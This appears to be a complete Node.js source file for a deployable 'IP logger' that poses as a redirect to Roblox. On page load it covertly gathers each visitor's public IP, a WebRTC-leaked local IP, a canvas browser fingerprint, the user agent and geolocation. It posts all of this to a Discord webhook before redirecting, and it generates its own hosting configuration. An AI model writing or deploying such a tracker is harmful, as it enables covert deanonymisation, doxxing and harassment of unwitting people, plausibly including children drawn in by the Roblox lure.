const express = require('express');
const axios = require('axios');
const morgan = require('morgan');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const app = express();

// Middleware for security and logging
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      connectSrc: ["'self'", 'https://ip-api.com', 'https://discord.com'],
    },
  },
}));
app.use(cors());
app.use(express.json());
app.use(morgan('combined', {
  stream: {
    write: (message) => fs.appendFileSync(path.join(__dirname, 'logs.txt'), message),
  },
}));

// Rate limiting to prevent abuse
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,
  message: 'Too many requests, please try again later.',
});
app.use(limiter);

// Environment variables
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'YOUR_DISCORD_WEBHOOK_URL_HERE';
const REDIRECT_URL = 'https://www.roblox.com';

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Utility function to get client IP with VPN bypass attempts
const getClientIp = (req) => {
  const headers = req.headers;
  const ipSources = [
    headers['x-forwarded-for'],
    headers['cf-connecting-ip'], // Cloudflare
    headers['x-real-ip'],
    headers['x-client-ip'],
    req.ip,
  ];
  let ip = 'Unknown';
  for (const source of ipSources) {
    if (source) {
      ip = source.split(',')[0].trim();
      break;
    }
  }
  return ip;
};

// Utility function to fetch geolocation data
const fetchGeoData = async (ip) => {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`, {
      timeout: 5000,
    });
    return response.data;
  } catch (error) {
    console.error(`GeoData Error: ${error.message}`);
    return null;
  }
};

// Utility function to send data to Discord webhook
const sendToDiscord = async (data) => {
  try {
    const embed = {
      title: 'New Visitor Data Logged',
      color: 0x00ff00,
      fields: [
        { name: 'IP Address', value: data.ip || 'Unknown', inline: true },
        { name: 'Local IP (WebRTC)', value: data.localIp || 'Unknown', inline: true },
        { name: 'Country', value: data.country || 'Unknown', inline: true },
        { name: 'Region', value: data.region || 'Unknown', inline: true },
        { name: 'City', value: data.city || 'Unknown', inline: true },
        { name: 'ISP', value: data.isp || 'Unknown', inline: true },
        { name: 'User Agent', value: data.userAgent || 'Unknown', inline: false },
        { name: 'Browser Fingerprint', value: data.fingerprint || 'Unknown', inline: false },
        { name: 'Timestamp', value: new Date().toISOString(), inline: false },
      ],
      footer: { text: 'Enhanced IP Logger by Zack' },
    };

    await axios.post(DISCORD_WEBHOOK_URL, { embeds: [embed] });
  } catch (error) {
    console.error(`Discord Webhook Error: ${error.message}`);
  }
};

// Route to handle data logging
app.post('/log', async (req, res) => {
  try {
    const { localIp, fingerprint } = req.body;
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const geoData = await fetchGeoData(ip);

    const logData = {
      ip,
      localIp: localIp || 'Unknown',
      fingerprint: fingerprint || 'Unknown',
      userAgent,
      country: geoData?.country || 'Unknown',
      region: geoData?.regionName || 'Unknown',
      city: geoData?.city || 'Unknown',
      isp: geoData?.isp || 'Unknown',
    };

    // Send to Discord
    await sendToDiscord(logData);

    // Log to file
    fs.appendFileSync(
      path.join(__dirname, 'logs.txt'),
      `[${new Date().toISOString()}] IP: ${ip}, Local IP: ${localIp}, Fingerprint: ${fingerprint}, UA: ${userAgent}\n`
    );

    res.json({ success: true });
  } catch (error) {
    console.error(`Log Route Error: ${error.message}`);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Serve HTML
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(`Server Error: ${err.message}`);
  res.redirect(REDIRECT_URL);
});

// Frontend HTML
const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #1a1a1a;
      color: #fff;
      font-family: Arial, sans-serif;
      overflow: hidden;
    }
    .loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .container {
      text-align: center;
      animation: fadeIn 1s ease-in;
    }
    @keyframes fadeIn {
      0% { opacity: 0; }
      100% { opacity: 1; }
    }
    p {
      font-size: 1.2em;
      color: #ccc;
    }
    .error {
      color: #e74c3c;
      display: none;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="loader"></div>
    <p>Redirecting to Roblox...</p>
    <p class="error" id="errorMsg"></p>
  </div>
  <script>
    // Client-side error logging
    const logError = (message) => {
      console.error(message);
      const errorElement = document.getElementById('errorMsg');
      if (errorElement) {
        errorElement.textContent = message;
        errorElement.style.display = 'block';
      }
    };

    // Generate browser fingerprint
    const getFingerprint = async () => {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Fingerprint', 2, 2);
        const canvasData = canvas.toDataURL();

        const fingerprint = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          screen: \`\${window.screen.width}x\${window.screen.height}\`,
          colorDepth: window.screen.colorDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          canvas: canvasData.substring(0, 50), // Partial canvas data
        };
        return btoa(JSON.stringify(fingerprint)); // Base64 encode
      } catch (error) {
        logError('Fingerprint Error: ' + error.message);
        return 'Unknown';
      }
    };

    // Get local IP via WebRTC
    const getLocalIp = () => {
      return new Promise((resolve) => {
        try {
          const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
          if (!RTCPeerConnection) {
            resolve('WebRTC Not Supported');
            return;
          }

          const pc = new RTCPeerConnection({ iceServers: [] });
          pc.createDataChannel('');
          pc.onicecandidate = (event) => {
            if (event.candidate) {
              const ipMatch = event.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
              if (ipMatch) resolve(ipMatch[1]);
            }
          };
          pc.createOffer()
            .then((offer) => pc.setLocalDescription(offer))
            .catch((error) => {
              logError('WebRTC Error: ' + error.message);
              resolve('Unknown');
            });

          setTimeout(() => resolve('Unknown'), 2000); // Fallback
        } catch (error) {
          logError('WebRTC Setup Error: ' + error.message);
          resolve('Unknown');
        }
      });
    };

    // Send data to server
    const logData = async () => {
      try {
        const localIp = await getLocalIp();
        const fingerprint = await getFingerprint();
        const response = await fetch('/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ localIp, fingerprint }),
        });
        if (!response.ok) {
          throw new Error('Failed to log data');
        }
        window.location.href = '${REDIRECT_URL}';
      } catch (error) {
        logError('Client Error: ' + error.message);
        setTimeout(() => window.location.href = '${REDIRECT_URL}', 1000);
      }
    };

    // Run on page load
    window.onload = () => {
      try {
        logData();
      } catch (error) {
        logError('Onload Error: ' + error.message);
        setTimeout(() => window.location.href = '${REDIRECT_URL}', 1000);
      }
    };

    // Fallback redirect
    setTimeout(() => {
      try {
        window.location.href = '${REDIRECT_URL}';
      } catch (error) {
        logError('Redirect Error: ' + error.message);
      }
    }, 3000);
  </script>
</body>
</html>
`;

// Write HTML to public/index.html
fs.mkdirSync(path.join(__dirname, 'public'), { recursive: true });
fs.writeFileSync(path.join(__dirname, 'public', 'index.html'), htmlContent);

// Vercel configuration
const vercelConfig = {
  version: 2,
  builds: [
    {
      src: 'index.js',
      use: '@vercel/node',
    },
  ],
  routes: [
    {
      src: '/(.*)',
      dest: '/index.js',
    },
  ],
};

// Write Vercel config
fs.writeFileSync(
  path.join(__dirname, 'vercel.json'),
  JSON.stringify(vercelConfig, null, 2)
);

// Package.json for dependencies
const packageJson = {
  name: 'ip-logger',
  version: '1.0.0',
  scripts: {
    start: 'node index.js',
  },
  dependencies: {
    express: '^4.18.2',
    axios: '^1.6.7',
    morgan: '^1.10.0',
    helmet: '^7.1.0',
    'express-rate-limit': '^7.1.5',
    cors: '^2.8.5',
    uuid: '^9.0.1',
  },
};

// Write package.json
fs.writeFileSync(
  path.join(__dirname, 'package.json'),
  JSON.stringify(packageJson, null, 2)
);

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// Export for Vercel
module.exports = app;
